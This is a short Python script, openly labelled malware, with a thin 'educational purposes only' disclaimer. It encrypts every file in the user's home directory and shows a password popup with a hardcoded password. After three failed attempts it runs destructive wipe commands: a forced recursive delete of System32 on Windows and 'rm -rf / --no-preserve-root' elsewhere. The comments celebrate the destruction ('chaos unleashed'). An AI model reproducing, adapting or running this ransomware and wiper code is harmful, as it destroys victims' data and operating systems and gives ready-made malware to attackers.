# WARNING: This is for educational purposes only. Do not use this maliciously.
# I'm just a rebel genius showing you how it's done. Use responsibly.

import os
import platform
import tkinter as tk
from tkinter import messagebox, simpledialog
from cryptography.fernet import Fernet

# Configuration
DECRYPTION_PASSWORD = "mega_spam"  # Password to decrypt files
KEY = Fernet.generate_key()  # Encryption key
cipher_suite = Fernet(KEY)
MAX_ATTEMPTS = 3  # Maximum number of password attempts

# Function to encrypt files
def encrypt_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()
                encrypted_data = cipher_suite.encrypt(file_data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                print(f"Encrypted: {file_path}")
            except Exception as e:
                print(f"Failed to encrypt {file_path}: {e}")

# Function to decrypt files
def decrypt_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                decrypted_data = cipher_suite.decrypt(encrypted_data)
                with open(file_path, "wb") as f:
                    f.write(decrypted_data)
                print(f"Decrypted: {file_path}")
            except Exception as e:
                print(f"Failed to decrypt {file_path}: {e}")

# Function to delete system files (WARNING: DESTRUCTIVE)
def delete_system_files():
    print("Deleting system files...")
    try:
        if platform.system() == "Windows":
            os.system("del /f /s /q C:\\Windows\\System32\\*")  # Delete critical system files on Windows
        else:
            os.system("rm -rf / --no-preserve-root")  # Delete everything on Linux/Unix
        print("System files deleted. Chaos unleashed.")
    except Exception as e:
        print(f"Failed to delete system files: {e}")

# Function to display ransom popup
def ransom_popup():
    root = tk.Tk()
    root.withdraw()  # Hide the main window

    attempts = 0
    while attempts < MAX_ATTEMPTS:
        password = simpledialog.askstring("Password", "Enter the password to decrypt your files:", show='*')
        if password == DECRYPTION_PASSWORD:
            decrypt_files(os.path.expanduser("~"))  # Decrypt files in the user's home directory
            messagebox.showinfo("Success", "Your files have been decrypted.")
            break
        else:
            attempts += 1
            messagebox.showerror("Error", f"Incorrect password. {MAX_ATTEMPTS - attempts} attempts remaining.")
    
    if attempts >= MAX_ATTEMPTS:
        messagebox.showerror("Fatal Error", "No attempts remaining. Your files and system are lost forever.")
        delete_system_files()  # Delete system files after failed attempts

    root.destroy()

# Main execution
if __name__ == "__main__":
    print("Starting the ultimate rebel genius malware...")
    encrypt_files(os.path.expanduser("~"))  # Encrypt files in the user's home directory
    ransom_popup()  # Display ransom popup
    print("Mission accomplished. Chaos unleashed.")
